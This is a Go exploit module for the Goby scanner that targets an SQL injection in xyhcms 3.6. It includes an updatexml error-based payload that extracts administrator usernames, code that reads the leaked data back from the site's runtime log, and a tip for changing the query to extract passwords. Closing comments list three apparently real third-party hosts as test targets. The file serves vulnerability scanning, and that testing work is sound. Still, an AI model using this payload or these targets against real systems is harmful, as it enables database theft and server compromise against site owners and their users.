package exploits

import (
    "crypto/md5"
    "fmt"
    "git.gobies.org/goby/goscanner/goutils"
    "git.gobies.org/goby/goscanner/jsonvul"
    "git.gobies.org/goby/goscanner/scanconfig"
    "git.gobies.org/goby/httpclient"
    "io"
    "math/rand"
    "regexp"
    "strings"
    "time"
)

func init() {
    expJson := `{
    "Name": "xyhcms LtController.class.php sql injection vulnerability",
    "Description": "<p><a href=\"https://fanyi.baidu.com/?aldtype=16047###\"></a><a></a></p><p>Xyhcms is a completely open source CMS content management system, which is simple, easy to use, safe, stable and free.</p><p>In xyhcms version 3.6, ThinkPHP can use key to construct SQL statements for injection when processing order by sorting. It is found in ltcontroller.class.php that the incoming orderby is not filtered, resulting in SQL injection.</p>",
    "Product": "xyhcms",
    "Homepage": "http://www.xyhcms.com/",
    "DisclosureDate": "2022-07-23",
    "Author": "hututuZH",
    "FofaQuery": "header=\"X-Powered-By: XYHCMS\" || banner=\"X-Powered-By: XYHCMS\" || body=\"Power by XYHCMS\"",
    "GobyQuery": "header=\"X-Powered-By: XYHCMS\" || banner=\"X-Powered-By: XYHCMS\" || body=\"Power by XYHCMS\"",
    "Level": "3",
    "Impact": "<p>In version 3.6 of xyhcms, there is a SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.</p>",
    "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"http://www.xyhcms.com/\">http://www.xyhcms.com/</a></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "http://althims.com/2020/02/03/xyhcms-3-6/"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "sql",
            "type": "input",
            "value": "/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(SELECT(group_concat(USERNAME))FROM(xyh_admin))),1);]=1"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2019-43821"
    ],
    "CVSSScore": "7",
    "Translation": {
        "CN": {
            "Name": "xyhcms LtController.class.php 文件 sql 注入漏洞",
            "Product": "xyhcms",
            "Description": "<p>xyhcms是完全开源的一套CMS内容管理系统,简洁,易用,安全,稳定,免费。</p><p>xyhcms在3.6版本中，ThinkPHP在处理order by排序时可利用key构造SQL语句进行注入，LtController.class.php中发现传入了orderby未进行过滤导致sql注入。</p>",
            "Recommendation": "<p>1、厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"http://www.xyhcms.com/\">http://www.xyhcms.com/</a><br></p><p>2、部署Web应用防火墙，对数据库操作进行监控。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>xyhcms在3.6版本中，存在sql注入漏洞。攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "xyhcms LtController.class.php sql injection vulnerability",
            "Product": "xyhcms",
            "Description": "<p><a href=\"https://fanyi.baidu.com/?aldtype=16047###\"></a><a></a></p><p>Xyhcms is a completely open source CMS content management system, which is simple, easy to use, safe, stable and free.</p><p>In xyhcms version 3.6, ThinkPHP can use key to construct SQL statements for injection when processing order by sorting. It is found in ltcontroller.class.php that the incoming orderby is not filtered, resulting in SQL injection.</p>",
            "Recommendation": "<p>1. The vendor has released a bug fix, please pay attention to the update in time:</p><p><a href=\"http://www.xyhcms.com/\">http://www.xyhcms.com/</a><br></p><p>2. Deploy a web application firewall to monitor database operations.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>In version 3.6 of xyhcms, there is a SQL injection vulnerability. In addition to using SQL injection vulnerabilities to obtain information in the database (for example, the administrator's back-end password, the user's personal information of the site), an attacker can write a Trojan horse to the server even in a high-privileged situation to further obtain server system permissions.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

    ExpManager.AddExploit(NewExploit(
        goutils.GetFileName(),
        expJson,
        func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
            random := rand.New(rand.NewSource(time.Now().UnixNano()))

            randomName := fmt.Sprintf("%02v", random.Int31n(100))
            uri := "/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20md5(" + randomName + ")),0x3a),1);]=1"
            writeStr := md5.New()
            io.WriteString(writeStr, randomName)
            md5Str := fmt.Sprintf("%x", writeStr.Sum(nil))

            if _, err := httpclient.SimpleGet(u.FixedHostInfo + uri); err == nil {

                year := time.Now().Format("2006")
                month := time.Now().Format("01")
                day := time.Now().Format("02")

                uriSql := "//App/Runtime/Logs/Api/" + year[2:] + "_" + month + "_" + day + ".log"

                if respSql, err := httpclient.SimpleGet(u.FixedHostInfo + uriSql); err == nil {
                    return respSql.StatusCode == 200 && strings.Contains(respSql.Utf8Html, md5Str[:len(md5Str)-2])
                }
            }
            return false
        },

        func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
            sql := ss.Params["sql"].(string)

            if _, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + sql); err == nil {

                year := time.Now().Format("2006")
                month := time.Now().Format("01")
                day := time.Now().Format("02")

                uri := "//App/Runtime/Logs/Api/" + year[2:] + "_" + month + "_" + day + ".log"

                if respName, err := httpclient.SimpleGet(expResult.HostInfo.FixedHostInfo + uri); err == nil {
                    regularMatchUser, _ := regexp.Compile("syntax error: ':(.*)?'")
                    sqlResults := regularMatchUser.FindAllString(respName.Utf8Html, -1)
                    var result string
                    for _, i := range sqlResults {
                        result = i[16:] + "\n"
                    }
                    expResult.Success = true
                    expResult.Output = "sqlResults:" + result[:len(result)-2] + "\nIf the result is MD5, you need to query the database name first and then query.sql:/index.php/Api/Lt/alist?orderby[updatexml(1,concat(0x3a,(select%20database()),0x3a),1);]=1\nTo query the password, you need to change the username to password."
                }
            }
            return expResult
        },
    ))
}

//poc时有随机md5防止误报，普通用户poc验证后才能进入exp利用，exp直接利用时，有syntax error:后有个“：”符号防止和普通syntax error匹配。
//出现结果为md5是因为数据库名不对，为了用户能查询除了用户名及密码，所以增加了提示如何查询，如果发两次包，数据库带入第二次查询，会破坏查询的灵活性。
//测试ip
//http://124.223.108.55:8081
//dg-italily.e580.cn:80
//139.199.188.117:88
